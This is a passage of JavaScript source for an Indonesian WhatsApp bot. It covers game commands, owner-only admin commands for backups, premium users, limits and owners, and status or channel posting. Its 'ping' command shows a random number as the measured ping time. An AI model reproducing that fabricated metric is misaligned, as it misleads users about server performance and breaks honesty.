					if (m.chat in asahotak) {
						let json = asahotak[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in lengkapikalimat) {
						let json = lengkapikalimat[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakbendera) {
						let json = tebakbendera[m.chat][1]
						newReply('```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakkalimat) {
						let json = tebakkalimat[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in siapaaku) {
						let json = siapaaku[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakkimia) {
						let json = tebakkimia[m.chat][1]
						newReply('```' + json.unsur.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebaklirik) {
						let json = tebaklirik[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebaktebakan) {
						let json = tebaktebakan[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in susunkata) {
						let json = susunkata[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in caklontong) {
						let json = caklontong[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tekateki) {
						let json = tekateki[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'nyerah': {
				try {
					if (m.chat in siapaaku) {
						clearTimeout(siapaaku[m.chat][3])
						delete siapaaku[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakkalimat) {
						clearTimeout(tebakkalimat[m.chat][3])
						delete tebakkalimat[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakbendera) {
						clearTimeout(tebakbendera[m.chat][3])
						delete tebakbendera[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakkata) {
						clearTimeout(tebakkata[m.chat][3])
						delete tebakkata[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in asahotak) {
						clearTimeout(asahotak[m.chat][3])
						delete asahotak[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in lengkapikalimat) {
						clearTimeout(lengkapikalimat[m.chat][3])
						delete lengkapikalimat[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakgame) {
						clearTimeout(tebakgame[m.chat][3])
						delete tebakgame[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakhero) {
						clearTimeout(tebakhero[m.chat][3])
						delete tebakhero[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakff) {
						clearTimeout(tebakff[m.chat][3])
						delete tebakff[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakkabupaten) {
						clearTimeout(tebakkabupaten[m.chat][3])
						delete tebakkabupaten[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakjkt48) {
						clearTimeout(tebakjkt48[m.chat][3])
						delete tebakjkt48[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakhewan) {
						clearTimeout(tebakhewan[m.chat][3])
						delete tebakhewan[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakml) {
						clearTimeout(tebakml[m.chat][3])
						delete tebakml[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakchara) {
						clearTimeout(tebakchara[m.chat][3])
						delete tebakchara[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebaklogo) {
						clearTimeout(tebaklogo[m.chat][3])
						delete tebaklogo[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakaplikasi) {
						clearTimeout(tebakaplikasi[m.chat][3])
						delete tebakaplikasi[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakkimia) {
						clearTimeout(tebakkimia[m.chat][3])
						delete tebakkimia[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebaklirik) {
						clearTimeout(tebaklirik[m.chat][3])
						delete tebaklirik[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebaktebakan) {
						clearTimeout(tebaktebakan[m.chat][3])
						delete tebaktebakan[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in susunkata) {
						clearTimeout(susunkata[m.chat][3])
						delete susunkata[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in caklontong) {
						clearTimeout(caklontong[m.chat][3])
						delete caklontong[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakgambar) {
						clearTimeout(tebakgambar[m.chat][3])
						delete tebakgambar[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
					if (m.chat in tekateki) {
						clearTimeout(tekateki[m.chat][3])
						delete tekateki[m.chat]
						return sock.sendMessage(m.chat, {
							text: `_Lemahhh_ 😏`
						}, {
							quoted: m
						})
					}
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'backup': {
				if (!isCreator) return newReply(mess.owner);
				if (isBot) return;
				let sender = m.mentionedJid[0] || m.sender || slimecode.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
				let date = new Date();
				let filename = await generateRandomHexName(32);
				const { execSync } = require('child_process');
				const ls = (await execSync('ls')).toString().split('\n').filter((cek) => cek !== 'node_modules' && cek !== 'package-lock.json' && cek !== 'yarn.lock' && cek !== '');
				await newReply('Hasil backup akan dikirim lewat chat pribadi ya!');
				await execSync(`zip -r ${filename}.zip ${ls.join(' ')}`);
				const sentMessage = await sock.sendMessage(sender, {
					document: await fs.readFileSync(`./${filename}.zip`),
					mimetype: 'application/zip',
					fileName: `${filename}.zip`,
					caption: 'Berhasil! Silakan download dan simpan file backup-nya ya.'
				});
				await execSync(`rm -rf ${filename}.zip`);
				console.log(`${filename}.zip telah dihapus dari file lokal.`);
			}
			break;

			case 'jadibot': {
				if (!isCreator) return newReply(mess.owner);
				if (isBot) return;
				await m.react('✅');
				try {
					await jadibot(sock, m, m.sender)
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break

			case 'stopjadibot': {
				if (!isCreator) return newReply(mess.owner);
				if (isBot) return;
				await m.react('✅');
				try {
					await stopjadibot(sock, m, m.sender)
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break

			case 'listjadibot': {
				if (!isCreator) return newReply(mess.owner);
				if (isBot) return;
				await m.react('✅');
				try {
					listjadibot(sock, m)
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break

			case 'ping':
			case 'speed':
			case 'info':
			case 'infobot': {
				try {
					const { download, upload } = await checkBandwidth();
					const cpus = os.cpus().map(cpu => {
						cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
						return cpu;
					});
					const cpu = cpus.reduce((last, cpu, _, { length }) => {
						last.total += cpu.total;
						last.speed += cpu.speed / length;
						last.times.user += cpu.times.user;
						last.times.nice += cpu.times.nice;
						last.times.sys += cpu.times.sys;
						last.times.idle += cpu.times.idle;
						last.times.irq += cpu.times.irq;
						return last;
					}, {
						speed: 0,
						total: 0,
						times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 }
					});
					const osInfo = await nou.os.oos();
					const ramInfo = await nou.mem.info();
					const storage = await nou.drive.info();
					const netStat = await nou.netstat.inOut();
					const uptime = nou.os.uptime();
					let responText = `📡 *Jaringan Server*\n`;
					responText += `- *Ping*: ${Math.random().toFixed(4)} detik\n`;
					responText += `- *Jaringan Masuk*: ${download}\n`;
					responText += `- *Jaringan Keluar*: ${upload}\n\n`;
					responText += `🖥️ *Informasi Server*\n`;
					responText += `- *OS*: ${osInfo}\n`;
					responText += `- *IP Address*: ${nou.os.ip()}\n`;
					responText += `- *Tipe OS*: ${nou.os.type()}\n`;
					responText += `- *Hostname*: ${nou.os.hostname()}\n`;
					responText += `- *Arsitektur*: ${nou.os.arch()}\n`;
					responText += `- *Waktu Aktif*: ${Math.floor(uptime / 3600)}h, ${Math.floor((uptime % 3600) / 60)}m\n\n`;
					responText += `💾 *RAM:*\n`;
					responText += `- *Total*: ${ramInfo.totalMemMb} MB\n`;
					responText += `- *Digunakan*: ${ramInfo.usedMemMb} MB\n`;
					responText += `- *Tersedia*: ${ramInfo.freeMemMb} MB\n\n`;
					responText += `📂 *Penyimpanan:*\n`;
					responText += `- *Total*: ${storage.totalGb} GB\n`;
					responText += `- *Digunakan*: ${storage.usedGb} GB (${storage.usedPercentage}%)\n`;
					responText += `- *Tersedia*: ${storage.freeGb} GB (${storage.freePercentage}%)\n\n`;
					responText += `⚙️ *CPU (${cpus.length} Core)*\n`;
					responText += `- *Model*: ${cpus[0].model.trim()}\n`;
					responText += `- *Kecepatan*: ${cpu.speed.toFixed(2)} MHz\n`;
					responText += `${Object.keys(cpu.times).map(type => `- *${type}*: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`;
					await sock.sendMessage(m.chat, { text: responText }, { quoted: m });
				} catch (err) {
					console.error(err);
					await newReply('Maaf kak, ada error waktu ambil informasi perangkat. 🙏');
				}
			}
			break;

			case 'sc': 
			case 'script': {
				let captionText = `Nyari ${command}? Buy di wa.me/${ownerNumber} ✨`;
				newReply(captionText);
			};
			break;

			case 'addbadword': 
			case 'addbd': {
				if (!isCreator) return newReply(mess.owner);
				if (!groupAdmins) return newReply(mess.admin);
				if (args.length < 1) return newReply(`📝 *Kirim perintah*: ${prefix}addbadword [kata kasar]\n*Kirim perintah*: ${prefix}addbadword asshole`);
				bad.push(q);
				fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad));
				newReply('✅ *Kata kasar berhasil ditambahkan ke daftar!*');
			}
			break;

			case 'delbadword': 
			case 'deldb': {
				if (!isCreator) return newReply(mess.owner);
				if (!groupAdmins) return newReply(mess.admin);
				if (args.length < 1) return newReply(`📝 *Kirim perintah*: ${prefix}delbadword [kata kasar]\n*Kirim perintah*: ${prefix}delbadword asshole`);
				bad.splice(q);
				fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad));
				newReply('✅ *Kata kasar berhasil dihapus dari daftar!*');
			}
			break;

			case 'resetuser':
			case 'resetdbuser': {
				if (!isCreator) return newReply(mess.owner);
				newReply(`Berhasil menghapus semua data pengguna dari database.`);
				db.data.users = [];
			}
			break;

			case 'resethit':
			case 'resettotalhit': {
				if (!isCreator) return newReply(mess.owner);
				global.db.data.settings[botNumber].totalhit = 0;
				newReply(mess.done);
			}
			break;

			case 'setmenu': {
				if (!isCreator) return newReply(mess.owner);
				newReply(`Fitur *${command}* sudah tidak dapat digunakan lagi.`);
			}
			break;

			case 'setreply': {
				if (!isCreator) return newReply(mess.owner);	
				if (!text) return newReply(`Ada 4 pilihan reply (v1, v2, v3, v4)\nSilakan pilih salah satu.\n*Kirim perintah*: ${prefix + command} v1`);
				if (text.startsWith('v')) {
					typereply = text;
					return newReply(mess.done);
				};
				return newReply(`Ada 4 pilihan reply (v1, v2, v3, v4)\nSilakan pilih salah satu.\n*Kirim perintah*: ${prefix + command} v1`);
			}
			break;

			case 'storytext':
			case 'upswtext': {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply('Teksnya mana?');
				await sock.sendMessage('status@broadcast', { 
					text: text 
				}, { 
					backgroundColor: '#FF000000', 
					font: 3, 
					statusJidList: Object.keys(db.data.users) 
				});
				newReply('Sukses kirim status teks!');
			}
			break;

			case 'storyvideo':
			case 'upswvideo': {
				if (!isCreator) return newReply(mess.owner);
				if (/video/.test(mime)) {
					var videosw = await sock.downloadAndSaveMediaMessage(quoted);
					let fileSize = quoted.fileLength ? `${(quoted.fileLength / 1024 / 1024).toFixed(2)} MB` : 'Tidak diketahui';
					let mediaType = mime || 'Tidak diketahui';
					let sendTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
					let sender = `${m.pushName || ownerName}`;
					let defaultCaption = `📁 *Ukuran File*: ${fileSize}\n`;
					defaultCaption += `🎥 *Tipe Media*: ${mediaType}\n`;
					defaultCaption += `⏰ *Waktu Dikirim*: ${sendTime}\n`;
					defaultCaption += `👤 *Dikirim oleh*: ${sender}`;
					await sock.sendMessage('status@broadcast', {
						video: { url: videosw },
						caption: text ? text : defaultCaption
					}, {
						statusJidList: Object.keys(db.data.users)
					});

					await newReply('✅ Video berhasil dikirim ke status WhatsApp dengan caption bawaan!');
				} else {
					newReply('⚠️ Tolong reply ke video dulu ya, Kak! 🎥');
				}
			}
			break;

			case 'storyimg':
			case 'storyimage':
			case 'upswimg': {
				if (!isCreator) return newReply(mess.owner);
				if (/image/.test(mime)) {
					var imagesw = await sock.downloadAndSaveMediaMessage(quoted);
					let fileSize = quoted.fileLength ? `${(quoted.fileLength / 1024 / 1024).toFixed(2)} MB` : 'Tidak diketahui';
					let mediaType = mime || 'Tidak diketahui';
					let sendTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
					let sender = `${m.pushName || ownerName}`;
					let defaultCaption = `📁 *Ukuran File*: ${fileSize}\n`;
					defaultCaption += `🖼️ *Tipe Media*: ${mediaType}\n`;
					defaultCaption += `⏰ *Waktu Dikirim*: ${sendTime}\n`;
					defaultCaption += `👤 *Dikirim oleh*: ${sender}`;
					await sock.sendMessage('status@broadcast', {
						image: { url: imagesw },
						caption: text ? text : defaultCaption
					}, {
						statusJidList: Object.keys(db.data.users)
					});

					await newReply('✅ Gambar berhasil dikirim ke status WhatsApp dengan caption bawaan! 🖼️✨');
				} else {
					newReply('⚠️ Tolong reply ke gambar dulu ya, Kak! 🖼️');
				}
			}
			break;

			case 'storyaudio':
			case 'upswaudio': {
				if (!isCreator) return newReply(mess.owner);
				if (/audio/.test(mime)) {
					var audiosw = await sock.downloadAndSaveMediaMessage(quoted);
					await sock.sendMessage('status@broadcast', {
						audio: { url: audiosw },
						mimetype: 'audio/mp4',
						ptt: true
					}, {
						backgroundColor: '#FF000000',
						statusJidList: Object.keys(db.data.users)
					});
					await newReply('✅ Audio berhasil dikirim ke status WhatsApp!');
				} else {
					newReply('⚠️ Tolong reply ke audio dulu ya, Kak! 🎧');
				}
			}
			break;

			case 'uploadnewsletter':
			case 'upnewsletter':
			case 'upchannel':
			case 'upsaluran': 
			case 'upch':
			case 'upsal': {
				if (!isCreator) return newReply(mess.owner)
				try {
					if (!mime && !text) return newReply(`Uh-oh, kak! Kamu belum kirim media atau teks apa pun. Coba lagi ya! 🤭`)
					media = mime ? await quoted.download() : null
					let defaultCaption = "✨ Media ini dikirim melalui sistem otomatis MiwaAI! ✨"
					if (/image/.test(mime)) {
						sock.sendMessage(saluran, {
							image: media,
							caption: text ? text : defaultCaption,
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 999999, 
								isForwarded: true, 
								forwardedNewsletterMessageInfo: {
									newsletterName: saluranName,
									newsletterJid: saluran,
								},
								externalAdReply: {
									showAdAttribution: true,
									title: botName,
									body: ownerName,
									thumbnailUrl: imageUrl,
									sourceUrl: website,
									mediaType: 1,
									renderLargerThumbnail: true
								}
							}
						})
						newReply(`📸 Gambar berhasil diunggah ke saluran dengan caption: "${text ? text : defaultCaption}"`)
					} else if (/video/.test(mime)) {
						sock.sendMessage(saluran, {
							video: media,
							caption: text ? text : defaultCaption,
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 999999, 
								isForwarded: true, 
								forwardedNewsletterMessageInfo: {
									newsletterName: saluranName,
									newsletterJid: saluran,
								},
								externalAdReply: {
									showAdAttribution: true,
									title: botName,
									body: ownerName,
									thumbnailUrl: imageUrl,
									sourceUrl: website,
									mediaType: 1,
									renderLargerThumbnail: true
								}
							}
						})
						newReply(`🎥 Video berhasil diunggah ke saluran dengan caption: "${text ? text : defaultCaption}"`)
					} else if (/audio/.test(mime)) {
						sock.sendMessage(saluran, {
							audio: media,
							mimetype: mime,
							ptt: true,
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 999999, 
								isForwarded: true, 
								forwardedNewsletterMessageInfo: {
									newsletterName: saluranName,
									newsletterJid: saluran,
								},
								externalAdReply: {
									showAdAttribution: true,
									title: botName,
									body: ownerName,
									thumbnailUrl: imageUrl,
									sourceUrl: website,
									mediaType: 1,
									renderLargerThumbnail: true
								}
							}
						})
						newReply(`🎵 Audio berhasil diunggah ke saluran, kak!`)
					} else if (/text/.test(mime) || text) {
						sock.sendMessage(saluran, {
							text: text ? text : defaultCaption,
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 999999, 
								isForwarded: true, 
								forwardedNewsletterMessageInfo: {
									newsletterName: saluranName,
									newsletterJid: saluran,
								},
								externalAdReply: {
									showAdAttribution: true,
									title: botName,
									body: ownerName,
									thumbnailUrl: imageUrl,
									sourceUrl: website,
									mediaType: 1,
									renderLargerThumbnail: true
								}
							}
						})
						newReply(`💬 Pesan teks berhasil dikirim ke saluran: "${text ? text : defaultCaption}"`)
					} else {
						newReply(`Hmm... MiwaAI gak tau ini jenis media apa. Coba dicek lagi ya, kak! 🧐`)
					}
				} catch (error) {
					console.error(error)
					newReply(`Aduh, kak! 😣 Ada masalah waktu unggah ke saluran. Coba lagi nanti ya!`)
				}
			}
			break;

			case 'setimgmenu':
			case 'sim': {
				if (!isCreator) return newReply(mess.owner);
				let media = await sock.downloadAndSaveMediaMessage(quoted);
				await fsx.copy(media, './media/image.png');
				fs.unlinkSync(media);
				newReply('Gambar menu berhasil diset! 🎨');
			}
			break;

			case 'setvidmenu':
			case 'svm': 
			case 'setvgifmenu':
			case 'sgm': {
				if (!isCreator) return newReply(mess.owner);
				let media = await sock.downloadAndSaveMediaMessage(quoted);
				await fsx.copy(media, './media/vidmenu.mp4');
				fs.unlinkSync(media);
				newReply('Video menu berhasil diset! 🎬');
			}
			break;

			case 'addgelar':
			case 'addtitle': {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} nomor,gelar`);
				nonya = text.split(',')[0];
				titlenya = text.split(',')[1];
				let oo = `${nonya}@s.whatsapp.net`;
				db.data.users[oo].title = titlenya;
				await newReply('Gelar user berhasil ditambahkan! 🎉');
			}
			break;

			case 'delgelar':
			case 'deltitle': {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} number`);
				nonya = text.split(',')[0];
				let oo = `${nonya}@s.whatsapp.net`;
				db.data.users[oo].title = '';
				await newReply('Gelar user berhasil dihapus! ✨');
			}
			break;

			case 'addid':
			case 'addinfo': {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} nomor,nama,umur,asal,gelar`);
				let args = text.split(',').map(item => item.trim()); // Hilangkan spasi berlebih
				if (args.length < 5) return newReply('⚠️ Format salah! Pastikan mengirim: nomor,nama,umur,asal,gelar');
				let [nomor, nama, umur, asal, gelar] = args;
				// Validasi nomor
				if (!/^\d+$/.test(nomor)) return newReply('⚠️ Nomor harus berupa angka tanpa spasi atau simbol lain.');
				let userId = `${nomor}@s.whatsapp.net`;
				// Simpan data ke database
				db.data.users[userId].nama = nama;
				db.data.users[userId].umur = Number(umur);
				db.data.users[userId].askot = asal;
				db.data.users[userId].title = gelar;
				await newReply('✅ Identitas user berhasil ditambahkan! 🎉');
			}
			break;

			case 'addlimit':
			case 'givelimit': {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} 628123456789,10`);
				let [usernya, limitnya] = text.split(',');
				return handleLimit('add', usernya, limitnya);
			}
			break;

			case 'dellimit': {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} 628123456789,10`);
				let [usernya, limitnya] = text.split(',');
				return handleLimit('del', usernya, limitnya);
			}
			break;

			case 'resetlimit': {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} 628123456789`);
				let usernya = text;
				return handleLimit('reset', usernya);
			}
			break;

			case 'resetdblimit': {
				if (!isCreator) return newReply(mess.owner);
				let users = Object.keys(db.data.users);
				for (let jid of users) {
					const limitUser = db.data.users[jid].vip 
						? global.limit.vip 
						: checkPremiumUser(jid, premium) 
							? global.limit.premium 
							: global.limit.free;

					db.data.users[jid].limit = limitUser;
				}
				return newReply(`✅ Limit semua user berhasil di-reset! ✂️`);
			}
			break;

			case 'adduang':
			case 'givemoney': {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} 628123456789,1000`);
				let [usernya, uangnya] = text.split(',');
				return handleMoney('add', usernya, uangnya);
			}
			break;

			case 'deluang': {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} 628123456789,1000`);
				let [usernya, uangnya] = text.split(',');
			return handleMoney('del', usernya, uangnya);
			}
			break;

			case 'resetuang': {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} 628123456789`);
				let usernya = text;
				return handleMoney('reset', usernya);
			}
			break;

			case 'resetdbmoney': {
				if (!isCreator) return newReply(mess.owner);
				let users = Object.keys(db.data.users);
				for (let jid of users) {
					const uangUser = db.data.users[jid].vip 
						? global.uang.vip 
						: checkPremiumUser(jid, premium) 
							? global.uang.premium 
							: global.uang.free;

					db.data.users[jid].uang = uangUser;
				}
				return newReply(`✅ Uang semua user berhasil di-reset! ✂️`);
			}
			break;

			case 'addpr': case 'addprem': case 'addpremium': {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Contoh:\n${prefix + command} @tag,durasi(s/m/h/d)`);
				let [teks1, teks2] = text.split`,`;
				const nmrnya = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
				const onWa = await sock.onWhatsApp(nmrnya);
				if (!onWa.length > 0) return newReply('Nomor tersebut tidak terdaftar di WhatsApp! ❌');
				if (teks2) {
					let teks = `✅ Berhasil menambahkan @${nmrnya.split('@')[0]} sebagai pengguna *Premium* selama *${teks2}*!\n\n`;
					teks += `*Benefit Premium*:\n`;
					teks += `- *Download*: 50MB/s\n`;
					teks += `- *Limit*: 1000/d\n`;
					teks += `- *Request*: 10/5s\n`;
					teks += `- *VIP Access*: Yes\n`;
					teks += `- *User Priority*: Yes\n`;
					await addPremiumUser(nmrnya, teks2, premium);
					await newReply(teks);
					db.data.users[nmrnya].limit = db.data.users[nmrnya].vip ? global.limit.vip : global.limit.premium;
					db.data.users[nmrnya].uang = db.data.users[nmrnya].vip ? global.uang.vip : global.uang.premium;
					db.data.users[nmrnya].premium = true;
					db.data.users[nmrnya].vip = true;
				} else {
					newReply(`Masukkan durasi yang valid!\n*Kirim perintah*: ${prefix + command} @tag,durasi(s/m/h/d)`);
				}
			}
			break;

			case 'delpr': case 'delprem': case 'delpremium': {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Contoh:\n${prefix + command} @tag`);
				const nmrnya = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
				if (checkPremiumUser(nmrnya, premium)) {
					premium.splice(getPremiumPosition(nmrnya, premium), 1);
					fs.writeFileSync('./src/data/role/premium.json', JSON.stringify(premium));
					let teks = `✅ Berhasil menghapus @${nmrnya.split('@')[0]} dari daftar *Premium*!\n\n`;
					teks += `*Benefit Regular*:\n`;
					teks += `- *Download*: 2MB/s\n`;
					teks += `- *Limit*: 20/d\n`;
					teks += `- *Request*: 1/5s\n`;
					teks += `- *VIP Access*: No\n`;
					teks += `- *User Priority*: No\n`;
					await newReply(teks);
					db.data.users[nmrnya].limit = db.data.users[nmrnya].vip ? global.limit.vip : global.limit.free;
					db.data.users[nmrnya].uang = db.data.users[nmrnya].vip ? global.uang.vip : global.uang.free;
					db.data.users[nmrnya].premium = false;
					db.data.users[nmrnya].vip = false;
				} else {
					newReply(`⚠️ Pengguna @${nmrnya.split('@')[0]} bukan pengguna *Premium*!`);
				}
			}
			break;

			case 'listpremium': case 'listprem': {
				let txt = `*🌟 DAFTAR PREMIUM 🌟*\n\n`;
				let men = [];
				if (premium.length === 0) {
					txt += `Tidak ada pengguna premium saat ini. 🫤`;
				} else {
					for (let i of premium) {
						men.push(i.id);
						txt += `- *Nomor*: +${i.id.split('@')[0]}\n`;
						if (i.expired === 'PERMANENT') {
							txt += `- *Expired*: PERMANENT\n\n`;
						} else {
							let anu = ms(i.expired - Date.now());
							txt += `- *Expired*: ${anu.days}d, ${anu.hours}h, ${anu.minutes}m\n`;
							txt += `- *Limit*: ${db.data.users[i.id].limit}\n`;
							txt += `- *Uang*: Rp${db.data.users[i.id].uang.toLocaleString('id-ID')}\n\n`;
						}
					}
				}
				newReply(txt);
			};
			break;

			case 'addowner': {
				if (!isCreator) return newReply(mess.owner);
				if (!args[0]) return newReply(`Gunakan ${prefix + command} nomor\n*Kirim perintah*: ${prefix + command} ${ownerNumber}`);
				bnnd = q.split("|")[0].replace(/[^0-9]/g, '');
				let ceknye = await sock.onWhatsApp(bnnd);
				if (ceknye.length == 0) return newReply(`Masukkan nomor yang valid dan terdaftar di WhatsApp!`);
				owner.push(bnnd);
				fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner));
				newReply(`Nomor ${bnnd} sekarang menjadi Owner!!! 🎉`);
			}
			break;

			case 'delowner': {
				if (!isCreator) return newReply(mess.owner);
				if (!args[0]) return newReply(`Gunakan ${prefix + command} nomor\n*Kirim perintah*: ${prefix + command} ${ownerNumber}`);
				ya = q.split("|")[0].replace(/[^0-9]/g, '');
				unp = owner.indexOf(ya);
				owner.splice(unp, 1);
				fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner));
				newReply(`Nomor ${ya} berhasil dihapus dari daftar owner! ❌`);
			}
			break;

			case 'listowner': {
				let teks = `📝 *List Owner:*\n\n`;
				owner.forEach((x, i) => {
					teks += `⭐ ${i + 1}. ${x}\n`;
				});
				teks += `\n📊 *Total: ${owner.length}*`;
				newReply(teks);
			}
			break;

			case 'wl':
			case 'whitelist': {
				if (!isCreator && !isAdmins) return newReply(mess.admin)
				try {
					let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					if (ownerNumber.includes(users)) return newReply('Tidak Dapat Melakukannya Kepada Owner')
					if (!m.mentionedJid[0] && !m.quoted && !text) return newReply(`Tag/Reply Target Yang Mau Di ${command}`)
					const isWhitelistt = whitelist.includes(users) ? true : false
					if (isWhitelistt) return sock.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Telah Di Whitelist Sebelumnya`, m)
					whitelist.push(users)
					fs.writeFileSync('./database/whitelist.json', JSON.stringify(whitelist, null, 2))
					sock.sendTextWithMentions(m.chat, `Succes whitelist @${users.split('@')[0]}`, m)
				} catch (err) {
					newReply(`Tag/Reply Target Yang Mau Di Whitelist`)
				}
			}
			break

			case 'unwhite':
			case 'unwhitelist': {
				if (!isCreator && !isAdmins) return newReply(mess.admin)
				try {
					let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					if (ownerNumber.includes(users)) return newReply('Tidak Dapat Melakukannya Kepada Owner')
					if (!m.mentionedJid[0] && !m.quoted && !text) return newReply(`Tag/Reply Target Yang Mau Di ${command}`)
